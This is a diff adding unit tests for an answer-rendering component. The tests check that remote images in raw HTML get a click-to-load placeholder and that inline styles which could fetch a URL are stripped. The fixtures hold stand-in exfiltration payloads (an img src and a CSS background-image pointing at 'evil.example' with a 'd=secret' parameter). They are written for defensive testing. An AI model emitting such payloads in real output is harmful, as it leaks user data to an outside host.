@@ -104,3 +104,39 @@ describe('AnswerContent — third-party images need a click to load', () => {
     expect(getAllByText('Load image')).toHaveLength(1);
   });
 });
+
+describe('AnswerContent — the same policy for raw HTML, data: images and inline styles', () => {
+  const EVIL = 'https://evil.example/p?d=secret';
+  const imgSrcs = (root: HTMLElement) =>
+    Array.from(root.querySelectorAll('img')).map((i) => i.getAttribute('src'));
+
+  it('renders relative, same-origin and data: images directly', () => {
+    const dataUri = 'data:image/png;base64,iVBORw0KGgo=';
+    const sameOrigin = `${window.location.origin}/api/v1/document/d1/download`;
+    const { container, queryByTestId } = renderAnswer(
+      [
+        '![rel](/api/v1/knowledgeBase/stream/record/r1)',
+        '',
+        `![abs](${sameOrigin})`,
+        '',
+        `![data](${dataUri})`,
+      ].join('\n'),
+    );
+    expect(imgSrcs(container)).toEqual(['/api/v1/knowledgeBase/stream/record/r1', sameOrigin, dataUri]);
+    expect(queryByTestId('remote-image-placeholder')).toBeNull();
+  });
+
+  it('gives raw HTML <img> (rehypeRaw path) the same placeholder', () => {
+    const { container, getByText } = renderAnswer(`<p>see <img src="${EVIL}" alt="pixel"></p>`);
+    expect(imgSrcs(container)).toEqual([]);
+    expect(getByText('Load image')).toBeTruthy();
+  });
+
+  it.each([
+    'background-image:url(https://evil.example/?d=secret)',
+  ])('strips an inline style that could fetch: %s', (style) => {
+    const { container } = renderAnswer(`<span style='${style}'>x</span> <span style="color:red">y</span>`);
+    expect(container.innerHTML).not.toContain('evil.example');
+    expect(container.innerHTML).toContain('color: red');
+  });
+});
